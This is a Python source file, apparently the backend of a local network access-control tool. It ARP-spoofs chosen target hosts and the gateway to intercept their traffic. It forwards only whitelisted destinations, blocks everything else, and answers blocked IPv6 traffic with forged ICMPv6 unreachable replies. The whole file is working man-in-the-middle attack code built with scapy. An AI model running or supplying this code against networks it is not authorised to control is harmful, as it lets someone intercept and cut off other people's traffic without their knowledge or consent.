import sys
import json
import socket
import threading
import time
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from scapy.all import ARP, Ether, IP, TCP, UDP, sendp, sniff, get_if_hwaddr, srp, conf
from scapy.layers.inet6 import IPv6, ICMPv6DestUnreach

# --- 通讯函式 ---
def log(level, message):
    """向前端发送日志讯息"""
    print(json.dumps({"type": "log", "level": level, "message": message}), flush=True)

def event(event_type, data):
    """向前端发送事件"""
    print(json.dumps({"type": event_type, "data": data}), flush=True)

# --- 网路核心函式 ---
def get_mac_address(ip_address, interface):
    """根据 IP 位址获取 MAC 位址"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, iface=interface, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception as e:
        log('debug', f"get_mac_address for {ip_address} failed: {e}")
        return None

stop_event_flag = threading.Event()

def arp_spoof(gateway_ip, gateway_mac, target_macs, attacker_mac, interface, peer_macs):
    """持续进行 ARP 欺骗的背景执行绪"""
    while not stop_event_flag.is_set():
        try:
            for target_ip, target_mac in target_macs.items():
                if target_mac:
                    sendp(
                        Ether(dst=target_mac)
                        / ARP(
                            op=2,
                            psrc=gateway_ip,
                            pdst=target_ip,
                            hwsrc=attacker_mac,
                            hwdst=target_mac,
                        ),
                        iface=interface,
                        verbose=False,
                    )
                    sendp(
                        Ether(dst=gateway_mac)
                        / ARP(
                            op=2,
                            psrc=target_ip,
                            pdst=gateway_ip,
                            hwsrc=attacker_mac,
                            hwdst=gateway_mac,
                        ),
                        iface=interface,
                        verbose=False,
                    )
                    for peer_ip, peer_mac in peer_macs.items():
                        if not peer_mac:
                            continue
                        sendp(
                            Ether(dst=target_mac)
                            / ARP(
                                op=2,
                                psrc=peer_ip,
                                pdst=target_ip,
                                hwsrc=attacker_mac,
                                hwdst=target_mac,
                            ),
                            iface=interface,
                            verbose=False,
                        )
                        sendp(
                            Ether(dst=peer_mac)
                            / ARP(
                                op=2,
                                psrc=target_ip,
                                pdst=peer_ip,
                                hwsrc=attacker_mac,
                                hwdst=peer_mac,
                            ),
                            iface=interface,
                            verbose=False,
                        )
            stop_event_flag.wait(2)
        except Exception as e:
            log('error', f'Spoofing loop error: {e}')

def restore_arp(gateway_ip, gateway_mac, target_macs, interface, peer_macs):
    """恢复网路 ARP 表"""
    log('info', 'Restoring network for all targets...')
    for target_ip, target_mac in target_macs.items():
        if target_mac and gateway_mac:
            sendp(
                Ether(dst=target_mac)
                / ARP(
                    op=2,
                    psrc=gateway_ip,
                    pdst=target_ip,
                    hwsrc=gateway_mac,
                    hwdst=target_mac,
                ),
                iface=interface,
                count=5,
                verbose=False,
            )
            sendp(
                Ether(dst=gateway_mac)
                / ARP(
                    op=2,
                    psrc=target_ip,
                    pdst=gateway_ip,
                    hwsrc=target_mac,
                    hwdst=gateway_mac,
                ),
                iface=interface,
                count=5,
                verbose=False,
            )
        for peer_ip, peer_mac in peer_macs.items():
            if not target_mac or not peer_mac:
                continue
            sendp(
                Ether(dst=target_mac)
                / ARP(
                    op=2,
                    psrc=peer_ip,
                    pdst=target_ip,
                    hwsrc=peer_mac,
                    hwdst=target_mac,
                ),
                iface=interface,
                count=5,
                verbose=False,
            )
            sendp(
                Ether(dst=peer_mac)
                / ARP(
                    op=2,
                    psrc=target_ip,
                    pdst=peer_ip,
                    hwsrc=target_mac,
                    hwdst=peer_mac,
                ),
                iface=interface,
                count=5,
                verbose=False,
            )
    log('info', 'Network restored.')


class FrameForwarder:
    """将封包从大量 sniff 线程搬运到专用 L2 socket，减少 sendp 的重复开销"""

    def __init__(self, interface):
        self.interface = interface
        self.socket = conf.L2socket(iface=interface)
        self.queue: queue.Queue = queue.Queue(maxsize=4096)
        self._active = True
        self._thread = threading.Thread(target=self._pump, daemon=True)
        self._thread.start()

    def submit(self, packet):
        if not self._active:
            return
        try:
            self.queue.put_nowait(packet)
        except queue.Full:
            log('warning', 'Forward queue full, dropping packet to keep latency low.')

    def _pump(self):
        while self._active:
            frame = self.queue.get()
            if frame is None:
                break
            try:
                self.socket.send(frame)
            except Exception as exc:
                log('debug', f'Frame forward failed: {exc}')
        try:
            self.socket.close()
        except Exception:
            pass

    def close(self):
        self._active = False
        try:
            self.queue.put_nowait(None)
        except queue.Full:
            pass
        if self._thread.is_alive():
            self._thread.join(timeout=1.5)


class PacketEventLimiter:
    """限制事件送往前端的頻率，避免 IPC 過載造成額外延遲"""

    def __init__(self, min_interval=0.35):
        self.min_interval = min_interval
        self._last_emit = {}
        self._lock = threading.Lock()

    def should_emit(self, key):
        now = time.monotonic()
        with self._lock:
            last = self._last_emit.get(key, 0)
            if now - last >= self.min_interval:
                self._last_emit[key] = now
                return True
        return False

    def reset(self):
        with self._lock:
            self._last_emit.clear()

def normalize_mac(mac_address):
    return mac_address.lower() if mac_address else None


def strip_scope_id(address):
    return address.split('%', 1)[0]


def resolve_whitelist_entries(whitelist_urls):
    ipv4_set = set()
    ipv6_set = set()

    urls = [u for u in whitelist_urls if u]

    def _resolve(url_str):
        parsed = urlparse(url_str if '://' in url_str else f'http://{url_str}')
        hostname = parsed.hostname or url_str
        try:
            addrinfo_list = socket.getaddrinfo(hostname, None, proto=socket.IPPROTO_TCP)
        except socket.gaierror as exc:
            return hostname, set(), set(), f"Cannot resolve URL: {url_str} ({exc})"
        except Exception as exc:  # noqa: BLE001
            return hostname, set(), set(), f"Resolve error for {url_str}: {exc}"

        resolved_v4 = set()
        resolved_v6 = set()
        for family, _socktype, _proto, _canonname, sockaddr in addrinfo_list:
            if family == socket.AF_INET:
                resolved_v4.add(sockaddr[0])
            elif family == socket.AF_INET6:
                resolved_v6.add(strip_scope_id(sockaddr[0]))

        if not resolved_v4 and not resolved_v6:
            return hostname, set(), set(), f"No IP addresses resolved for {url_str}"
        return hostname, resolved_v4, resolved_v6, None

    if not urls:
        return ipv4_set, ipv6_set

    max_workers = min(8, len(urls))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_resolve, url): url for url in urls}
        for future in as_completed(futures):
            try:
                hostname, resolved_v4, resolved_v6, error_msg = future.result()
            except Exception as exc:  # noqa: BLE001
                log('warning', f"Whitelist resolve task failed: {exc}")
                continue

            if error_msg:
                log('warning', error_msg)
                continue

            ipv4_set.update(resolved_v4)
            ipv6_set.update(resolved_v6)
            log('info', f"Whitelist: {hostname} -> {sorted(resolved_v4 | resolved_v6)}")

    return ipv4_set, ipv6_set


def forward_frame(packet, forwarder, src_mac, dst_mac):
    if not forwarder:
        return
    frame = packet.copy()
    frame[Ether].src = src_mac
    frame[Ether].dst = dst_mac

    if frame.haslayer(IP):
        del frame[IP].chksum
    if frame.haslayer(IPv6):
        frame[IPv6].plen = None
    if frame.haslayer(TCP):
        del frame[TCP].chksum
    if frame.haslayer(UDP):
        del frame[UDP].chksum

    forwarder.submit(frame)

# --- 主程式逻辑 ---
def main():
    stop_event_flag.clear()
    spoof_thread = None
    forwarder = None
    limiter = None
    INTERFACE = GATEWAY_IP = ATTACKER_IP = None
    ATTACKER_MAC = GATEWAY_MAC = None
    target_macs = {}
    peer_macs = {}
    error = None

    try:
        config = json.loads(sys.argv[1])
        target_ips = config.get("target_ips", [])
        whitelist_urls = config.get("whitelist", [])

        if not target_ips:
            log('critical', "No target IPs provided. Exiting.")
            return

        route_info = conf.route
        if not route_info or not hasattr(route_info, 'route') or not route_info.route("0.0.0.0"):
            log('critical', "Could not determine default route.")
            return

        INTERFACE, ATTACKER_IP, GATEWAY_IP = route_info.route("0.0.0.0", verbose=False)

        if not INTERFACE or INTERFACE.startswith('lo'):
            log('critical', f"No valid network interface found. Detected: {INTERFACE}. Please check network connection.")
            return

        log('info', f"Network detected: IFACE={INTERFACE}, Gateway={GATEWAY_IP}")

        resolved_whitelist_ipv4, whitelist_ipv6 = resolve_whitelist_entries(whitelist_urls)
        whitelist_ipv4 = set(resolved_whitelist_ipv4)
        whitelist_ipv6 = set(whitelist_ipv6)
        whitelist_ipv4.update({GATEWAY_IP, "8.8.8.8", "8.8.4.4"})

        ATTACKER_MAC = normalize_mac(get_if_hwaddr(INTERFACE))
        GATEWAY_MAC = normalize_mac(get_mac_address(GATEWAY_IP, INTERFACE))

        mac_to_ip = {}
        for ip in target_ips:
            mac = normalize_mac(get_mac_address(ip, INTERFACE))
            if mac:
                target_macs[ip] = mac
                mac_to_ip[mac] = ip
                event('mac_found', {"ip": ip, "mac": mac})
            else:
                log('error', f"Failed to get MAC for target: {ip}")

        target_macs = {ip: mac for ip, mac in target_macs.items() if mac}

        if not ATTACKER_MAC or not GATEWAY_MAC or not target_macs:
            log('critical', "Missing essential MACs or could not find any target. Exiting.")
            return

        peer_macs = {}
        for peer_ip in resolved_whitelist_ipv4:
            if peer_ip == GATEWAY_IP:
                continue
            peer_mac = normalize_mac(get_mac_address(peer_ip, INTERFACE))
            if peer_mac:
                peer_macs[peer_ip] = peer_mac
                log('info', f"Whitelist peer detected: {peer_ip} -> {peer_mac}")
            else:
                log('warning', f"Could not determine MAC for whitelist host {peer_ip}")

        monitored_macs = set(target_macs.values())
        peer_macs = {ip: mac for ip, mac in peer_macs.items() if mac}
        ipv6_local_map = {}

        try:
            forwarder = FrameForwarder(INTERFACE)
        except Exception as exc:  # noqa: BLE001
            log('critical', f'Unable to initialize frame forwarder: {exc}')
            return
        limiter = PacketEventLimiter()

        def emit_packet(meta, force=False):
            if not limiter:
                event('packet', meta)
                return
            key = (
                meta.get('src'),
                meta.get('dst'),
                meta.get('protocol'),
                meta.get('status'),
            )
            if force or limiter.should_emit(key):
                event('packet', meta)

        bpf_filter = f"ether dst {ATTACKER_MAC} and (ip or ip6)"
        log('debug', f"Using BPF filter: {bpf_filter}")

        spoof_thread = threading.Thread(
            target=arp_spoof,
            args=(GATEWAY_IP, GATEWAY_MAC, target_macs, ATTACKER_MAC, INTERFACE, peer_macs),
            daemon=True,
        )
        spoof_thread.start()
        log('info', 'ARP spoofing thread started.')

        def block_ipv6_packet(packet, target_mac):
            try:
                offending = bytes(packet[IPv6])[:1232]
                response = (
                    Ether(src=ATTACKER_MAC, dst=target_mac)
                    / IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src)
                    / ICMPv6DestUnreach(code=1)
                    / offending
                )
                forwarder.submit(response)
                log('info', f"Blocked IPv6 traffic from {packet[IPv6].src} to {packet[IPv6].dst}")
            except Exception as err:
                log('debug', f"Failed to send IPv6 block packet: {err}")

        def packet_processor(packet):
            if not packet.haslayer(Ether):
                return

            src_mac = normalize_mac(packet[Ether].src)
            if src_mac == ATTACKER_MAC:
                return

            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst

                if src_ip in target_macs:
                    allowed = dst_ip in whitelist_ipv4
                    status = "allowed" if allowed else "blocked"
                    meta = {"status": status, "src": src_ip, "dst": dst_ip, "protocol": "ipv4"}
                    if packet.haslayer(TCP):
                        meta["dport"] = packet[TCP].dport
                    elif packet.haslayer(UDP):
                        meta["dport"] = packet[UDP].dport
                    emit_packet(meta, force=status == 'blocked')

                    if allowed:
                        next_hop_mac = peer_macs.get(dst_ip, GATEWAY_MAC)
                        forward_frame(packet, forwarder, ATTACKER_MAC, next_hop_mac)
                    # 非白名單流量留在本機，維持阻擋
                elif dst_ip in target_macs:
                    target_mac = target_macs[dst_ip]
                    forward_frame(packet, forwarder, ATTACKER_MAC, target_mac)

            elif packet.haslayer(IPv6):
                src_ipv6 = strip_scope_id(packet[IPv6].src)
                dst_ipv6 = strip_scope_id(packet[IPv6].dst)

                if src_mac in monitored_macs:
                    ipv6_local_map[src_ipv6] = src_mac
                    allowed = dst_ipv6 in whitelist_ipv6
                    status = "allowed" if allowed else "blocked"
                    emit_packet({
                        "status": status,
                        "src": mac_to_ip.get(src_mac, src_ipv6),
                        "dst": dst_ipv6,
                        "protocol": "ipv6",
                    }, force=status == 'blocked')

                    if allowed:
                        forward_frame(packet, forwarder, ATTACKER_MAC, GATEWAY_MAC)
                    else:
                        block_ipv6_packet(packet, src_mac)
                elif src_mac == GATEWAY_MAC:
                    target_mac = ipv6_local_map.get(dst_ipv6)
                    if target_mac:
                        forward_frame(packet, forwarder, ATTACKER_MAC, target_mac)

        try:
            sniff(
                prn=packet_processor,
                iface=INTERFACE,
                store=False,
                filter=bpf_filter,
                stop_filter=lambda _: stop_event_flag.is_set(),
            )
        except KeyboardInterrupt:
            log('info', 'Received interrupt signal, stopping monitoring.')
        except Exception as sniff_error:
            log('critical', f'Packet processing failed: {sniff_error}')
            error = sniff_error

    except Exception as exc:
        log('critical', f'A critical error occurred in backend: {exc}')
        error = exc
    finally:
        stop_event_flag.set()
        if spoof_thread and spoof_thread.is_alive():
            spoof_thread.join(timeout=3)
        if limiter:
            limiter.reset()
        if forwarder:
            forwarder.close()
        if INTERFACE and GATEWAY_IP and GATEWAY_MAC and target_macs:
            restore_arp(GATEWAY_IP, GATEWAY_MAC, target_macs, INTERFACE, peer_macs)

    if error:
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event_flag.set()

